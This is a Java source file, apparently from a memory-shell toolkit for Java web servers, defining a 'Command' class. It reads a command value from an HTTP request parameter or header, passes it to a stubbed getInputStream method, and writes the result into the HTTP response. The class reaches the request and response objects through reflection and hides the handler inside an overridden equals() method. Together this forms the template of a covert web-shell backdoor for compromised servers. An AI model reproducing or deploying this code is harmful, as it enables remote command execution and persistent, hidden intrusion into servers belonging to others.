package com.reajason.javaweb.memshell.shelltool.command;

import java.io.InputStream;
import java.io.OutputStream;
import java.lang.reflect.Field;
import java.util.Scanner;

/**
 * @author ReaJason
 * @since 2025/5/15
 */
public class Command {
    public static String paramName;

    @Override
    public boolean equals(Object obj) {
        Object[] args = ((Object[]) obj);
        Object request = unwrap(args[0], "request");
        Object response = unwrap(args[1], "response");
        try {
            String p = (String) request.getClass().getMethod("getParameter", String.class).invoke(request, paramName);
            if (p == null || p.isEmpty()) {
                p = (String) request.getClass().getMethod("getHeader", String.class).invoke(request, paramName);
            }
            if (p != null) {
                String param = getParam(p);
                InputStream inputStream = getInputStream(param);
                OutputStream outputStream = (OutputStream) response.getClass().getMethod("getOutputStream").invoke(response);
                outputStream.write(new Scanner(inputStream).useDelimiter("\\A").next().getBytes());
                outputStream.flush();
                outputStream.close();
                return true;
            }
        } catch (Throwable e) {
            e.printStackTrace();
        }
        return false;
    }

    private String getParam(String param) {
        return param;
    }

    private InputStream getInputStream(String param) throws Exception {
        return null;
    }

    @SuppressWarnings("all")
    public Object unwrap(Object obj, String fieldName) {
        try {
            return getFieldValue(obj, fieldName);
        } catch (Throwable e) {
            return obj;
        }
    }

    @SuppressWarnings("all")
    public static Object getFieldValue(Object obj, String name) throws Exception {
        Class<?> clazz = obj.getClass();
        while (clazz != Object.class) {
            try {
                Field field = clazz.getDeclaredField(name);
                field.setAccessible(true);
                return field.get(obj);
            } catch (NoSuchFieldException var5) {
                clazz = clazz.getSuperclass();
            }
        }
        throw new NoSuchFieldException(obj.getClass().getName() + " Field not found: " + name);
    }
}
